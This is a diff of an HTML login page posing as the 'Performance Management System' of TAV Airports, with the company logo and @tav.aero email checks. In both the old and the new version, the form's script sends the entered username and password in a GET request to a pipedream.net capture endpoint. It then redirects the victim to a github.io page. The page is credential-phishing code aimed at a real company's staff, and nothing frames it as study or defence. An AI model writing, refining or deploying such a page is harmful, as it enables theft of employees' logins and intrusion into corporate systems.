@@ -1,128 +1,158 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
-    <title>Performans Görüntüleme Sistemi</title>
-    <meta charset="UTF-8"/>
-    <style type="text/css">
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #d3d3d3; /* Arka planı açık gri yaptık */
-            color: white;
-            text-align: center;
-        }
-        .container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .login-form {
-            background-color: #ffffff; /* Login formunu beyaz yaptık */
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.6);
-        }
-        input[type=text], input[type=password] {
-            width: 280px;
-            padding: 15px;
-            margin: 5px 0 22px 0;
-            display: inline-block;
-            border: none;
-            background: #f1f1f1;
-            border-radius: 5px;
-        }
-        .login-button {
-            background-color: #add8e6; /* Giriş Yap butonunu hafif açık mavi yaptık */
-            color: black;
-            padding: 14px 20px;
-            margin: 8px 0;
-            border: none;
-            cursor: pointer;
-            width: 300px;
-            opacity: 0.9;
-            border-radius: 5px;
-        }
-        .login-button:hover {
-            opacity: 1;
-        }
-        .footer-text {
-            font-size: 12px;
-            margin-top: 20px;
-            text-align: center;
-        }
-        .icon {
-            position: fixed; /* Fixed position */
-            bottom: 10px; /* At the bottom */
-            right: 10px; /* At the right */
-            width: 200px; /* Moderate size for the icon */
-            height: auto; /* Maintain aspect ratio */
-        }
-    </style>
-
-    <script>
-    function validateForm() {
-        var username = document.forms["loginForm"]["username"].value;
-        var password = document.forms["loginForm"]["password"].value;
-        var errorMessage = document.getElementById('error-message');
-
-        errorMessage.textContent = ''; // Mevcut hata mesajını temizle
-
-        if (username.indexOf('@tav.aero') === -1) {
-            errorMessage.textContent = "Mail adresiniz @tav.aero şeklinde olmalıdır.";
-            return false;
-        }
-
-        if (password.length < 8) {
-            errorMessage.textContent = "Şifre en az 8 karakter uzunluğunda olmalıdır.";
-            return false;
-        }
-
-        // Kullanıcı bilgilerini GET metoduyla URL'ye ekleyerek gönderiyoruz
-        var params = new URLSearchParams();
-        params.append('username', username);
-        params.append('password', password);
-
-        // GET metodu kullanılarak URL'ye istek gönderiliyor
-        fetch('https://eo92nx61sdcl12r.m.pipedream.net/?' + params.toString(), {
-            method: 'GET',
-        })
-        .then(response => response.text())
-        .then(data => {
-            console.log('Başarılı:', data);
-            // Yönlendirme işlemi
-            window.location.href = "https://tavaero.github.io/TAV-PMS/bakim.html"; // Kullanıcı giriş yaptıktan sonra bu URL'ye yönlendirilecek
-        })
-        .catch((error) => {
-            console.error('Hata:', error);
-        });
-
-        return false; // Formun normal submit işlemini engelliyoruz
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Performance Monitoring System</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
     }
-    </script>
 
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #3a7bd5, #00d2ff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-form {
+      background-color: #ffffff;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+      width: 350px;
+      text-align: center;
+      animation: fadeIn 1s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .login-form h2 {
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background-color: #f9f9f9;
+      transition: all 0.3s;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #00d2ff;
+      outline: none;
+      background-color: #fff;
+    }
+
+    .login-button {
+      width: 100%;
+      background-color: #00d2ff;
+      color: white;
+      padding: 14px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-button:hover {
+      background-color: #009acb;
+    }
+
+    .footer-text {
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 13px;
+      margin-top: 10px;
+    }
+
+    .icon {
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      width: 150px;
+      opacity: 0.8;
+    }
+
+    .icon img {
+      width: 100%;
+    }
+  </style>
+
+  <script>
+    function validateForm() {
+      const username = document.forms["loginForm"]["username"].value;
+      const password = document.forms["loginForm"]["password"].value;
+      const errorMessage = document.getElementById('error-message');
+
+      errorMessage.textContent = '';
+
+      if (!username.endsWith('@tav.aero')) {
+        errorMessage.textContent = "Your email address must end with @tav.aero.";
+        return false;
+      }
+
+      if (password.length < 8) {
+        errorMessage.textContent = "The password must be at least 8 characters.";
+        return false;
+      }
+
+      const params = new URLSearchParams();
+      params.append('username', username);
+      params.append('password', password);
+
+      fetch('https://eosdcxafrlhu2y.m.pipedream.net' + params.toString(), {
+        method: 'GET',
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Başarılı:', data);
+        window.location.href = "https://tavaero.github.io/TAV-PMS/bakim.html";
+      })
+      .catch((error) => {
+        console.error('Hata:', error);
+        errorMessage.textContent = "Server error occurred.";
+      });
+
+      return false;
+    }
+  </script>
 </head>
 <body>
-    <div class="container">
-        <div class="login-form">
-            <h2 style="color: black;">Performance Management System</h2>
-            <!-- Form GET metodu ile gönderiliyor -->
-            <form name="loginForm" onsubmit="return validateForm()">
-                <input name="username" placeholder="Domain Hesabı" required type="text" />
-                <br />
-                <input name="password" placeholder="Şifre" required type="password" />
-                <br />
-                <div id="error-message" style="color: red;">&nbsp;</div>
-                <button class="login-button" type="submit">Giriş Yap</button>
 
-                <div class="footer-text">
-                    Bu yazılım TAV Havalimanları Şirketine Aittir.
-                </div>
-            </form>
-        </div>
-    </div>
+  <form name="loginForm" class="login-form" onsubmit="return validateForm()">
+    <h2>Performance Management System</h2>
+    <input name="username" placeholder="Domain Account" type="text" required />
+    <input name="password" placeholder="Password" type="password" required />
+    <div id="error-message" class="error-message">&nbsp;</div>
+    <button type="submit" class="login-button">Login</button>
+    <div class="footer-text">This software belongs to TAV Airports Company.</div>
+  </form>
 
-    <div class="icon">
-        <img alt="İkon" src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" style="width: 100%; height: auto;" />
-    </div>
+  <div class="icon">
+    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo"/>
+  </div>
+
 </body>
 </html>
